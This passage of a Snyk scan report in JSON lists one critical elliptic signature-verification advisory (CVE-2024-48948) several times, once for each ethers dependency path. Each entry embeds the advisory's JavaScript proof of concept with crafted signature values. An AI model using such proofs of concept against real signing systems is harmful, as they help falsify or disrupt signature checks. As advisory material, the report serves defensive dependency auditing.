          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/abi@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wordlists@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/providers@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar 